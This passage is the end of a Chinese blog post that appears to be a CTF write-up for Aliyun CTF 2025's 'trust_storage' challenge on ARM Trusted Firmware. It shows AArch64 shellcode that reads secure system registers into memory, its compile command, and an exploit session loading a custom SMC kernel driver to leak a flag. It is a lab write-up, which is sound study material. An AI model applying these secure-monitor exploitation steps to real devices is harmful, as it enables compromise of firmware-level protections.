        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">__asm__</span> <span class="nf">__volatile__</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;MOVK X0, #0x423d, LSL #16</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;MOVK X0, #0xc100</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;MRS X1, S3_3_C15_C12_0</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;STR W1, [X0]</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;MRS X1, S3_3_C15_C12_1</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;STR W1, [X0,#4]</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;MRS X1, S3_3_C15_C12_2</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;STR W1, [X0,#8]</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;MRS X1, S3_3_C15_C12_3</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;STR W1, [X0,#0xC]</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;MRS X1, S3_3_C15_C12_4</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;STR W1, [X0,#0x10]</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;MRS X1, S3_3_C15_C12_5</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;STR W1, [X0,#0x14]</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;MRS X1, S3_3_C15_C12_6</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;STR W1, [X0,#0x18]</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;MRS X1, S3_3_C15_C12_7</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;STR W1, [X0,#0x1C]</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;ret</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>编译：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>bash</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aarch64-linux-gnu-gcc -o shellcode ./shellcode.c</span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>提取：</p>
<img src="./img/trust_storage_wp/image-20250314163138195.png" alt="image-20250314163138195" style="zoom:50%;" />
<p><img alt="image-20250314162910063" loading="lazy" src="./img/trust_storage_wp/image-20250314162910063.png"></p>
<h2 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h2>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>bash</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Welcome to Buildroot, <span class="nb">type</span> root or <span class="nb">test</span> to login
</span></span><span class="line"><span class="cl">buildroot login: root
</span></span><span class="line"><span class="cl"><span class="c1"># mkdir /mnt/shared &amp;&amp; mount -t 9p -o trans=virtio hostshare /mnt/shared</span>
</span></span><span class="line"><span class="cl"><span class="c1"># insmod /mnt/shared/smc_driver.ko</span>
</span></span><span class="line"><span class="cl"><span class="c1"># cat /dev/step1_driver </span>
</span></span><span class="line"><span class="cl">cat: <span class="nb">read</span> error: Invalid argument
</span></span><span class="line"><span class="cl"><span class="c1"># cat /dev/step2_driver </span>
</span></span><span class="line"><span class="cl">cat: <span class="nb">read</span> error: Invalid argument
</span></span><span class="line"><span class="cl"><span class="c1"># dmesg</span>
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl"><span class="o">[</span>   24.694680<span class="o">]</span> smc_driver: loading out-of-tree module taints kernel.
</span></span><span class="line"><span class="cl"><span class="o">[</span>   24.700790<span class="o">]</span> SMC Driver: Initializing the driver
</span></span><span class="line"><span class="cl"><span class="o">[</span>   24.702449<span class="o">]</span> SMC Driver: Device created successfully
</span></span><span class="line"><span class="cl"><span class="o">[</span>   31.985097<span class="o">]</span> Step1: Device opened
</span></span><span class="line"><span class="cl"><span class="o">[</span>   31.986342<span class="o">]</span> SMC Driver: LOG_SVC_PLOG_SET, res.0 <span class="o">=</span> 0x423dc008
</span></span><span class="line"><span class="cl"><span class="o">[</span>   31.988060<span class="o">]</span> func2 is running on CPU <span class="m">2</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>   31.989497<span class="o">]</span> func1 is running on CPU <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>   31.990671<span class="o">]</span> Step1: Device closed
</span></span><span class="line"><span class="cl"><span class="o">[</span>   31.991532<span class="o">]</span> Condition successed!
</span></span><span class="line"><span class="cl"><span class="o">[</span>   35.817774<span class="o">]</span> Step2: Device opened
</span></span><span class="line"><span class="cl"><span class="o">[</span>   35.818487<span class="o">]</span> flag: flag<span class="o">{</span>123123123123<span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>   35.819386<span class="o">]</span> Step2: Device closed</span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><h1 id="reference">Reference<a hidden class="anchor" aria-hidden="true" href="#reference">#</a></h1>
<ul>
<li><a href="https://github.com/ARM-software/arm-trusted-firmware.git">https://github.com/ARM-software/arm-trusted-firmware.git</a></li>
<li><a href="http://infocenter.arm.com/help/topic/com.arm.doc.den0028b/ARM_DEN0028B_SMC_Calling_Convention.pdf">SMC Calling Convention</a></li>
<li><a href="https://www.iotsec-zone.com/article/479">Draytek3910 固件解密及漏洞分析</a></li>
<li><a href="https://blog.csdn.net/qq_16106195/article/details/133066328#t19">Linux与BL31之间添加SMC实现随机数获取</a></li>
<li><a href="https://xz.aliyun.com/news/17029">第三届阿里云CTF官方Writeup</a></li>
<li><a href="https://cnwangjihe.notion.site/trust_storage-1a32fe66351f80b1a884f80c22aa5137">cnwangjihe师傅的wp</a>（几经辗转联系到佬师要到wp！！！非常感谢！！！）</li>
<li><a href="https://lwn.net/Articles/65178/">Kernel threads made easy</a></li>
<li><a href="https://blog.impalabs.com/2212_advisory_huawei-secure-monitor.html#double-mapping-the-secure-monitor">Double Mapping the Secure Monitor</a></li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
      <li><a href="http://localhost:1313/tags/pwn/">Pwn</a></li>
      <li><a href="http://localhost:1313/tags/atf/">ATF</a></li>
      <li><a href="http://localhost:1313/tags/aliyunctf2025/">Aliyunctf2025</a></li>
      <li><a href="http://localhost:1313/tags/wp/">Wp</a></li>
    </ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">Hotaru&#39;s Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;
        console.log(container);

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        
        if (container.parentNode.parentNode.classList.contains("code-block")) {
            console.log("active");
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode
            .parentNode.parentNode.parentNode.parentNode.parentNode
            .appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
